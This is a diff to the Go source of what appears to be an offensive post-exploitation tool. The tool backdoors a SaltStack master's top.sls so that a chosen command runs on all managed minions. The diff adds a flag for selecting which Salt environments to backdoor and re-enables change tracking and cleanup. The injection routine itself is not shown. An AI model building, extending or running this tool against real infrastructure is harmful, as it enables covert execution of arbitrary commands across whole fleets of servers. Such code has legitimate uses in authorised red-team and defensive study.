@@ -44,10 +44,12 @@ var (
 	cleanup          bool
 	cleanupFile      = a.CleanupFile
 	saltBackupLoc    = a.SaltBackupLoc
+	specific         bool
 )
 
 func init() {
 	flag.BoolVar(&cleanup, "c", false, "Activate cleanup using the file location in settings.json")
+	flag.BoolVar(&specific, "s", false, "Specify which environments of the top.sls you would like to backdoor")
 }
 
 func backdoorSiteSpecific(topLoc string) {
@@ -254,11 +256,10 @@ func main() {
 
 	// gonna assume not root then we screwed
 	utils.CheckRoot()
-	//ansibleCfgs := findSaltConfig()
 
-	// 	if uploadFilePath != "" {
-	// 		moseutils.TrackChanges(cleanupFile, uploadFilePath)
-	// 	}
+	if uploadFilePath != "" {
+		moseutils.TrackChanges(cleanupFile, uploadFilePath)
+	}
 
 	found, binLoc := moseutils.FindFile("salt", []string{"/bin", "/home", "/opt", "/root", "/usr/bin"})
 	if !found {
@@ -269,10 +270,9 @@ func main() {
 		log.Fatalf("top.sls not found, exiting...")
 	}
 
-	// if cleanup {
-	// 	doCleanup(siteLoc)
-	// }
-	specific := false
+	if cleanup {
+		doCleanup(topLoc)
+	}
 
 	backupSite(topLoc)
 	msg("Backdooring the %s top.sls to run %s on all minions, please wait...", topLoc, bdCmd)
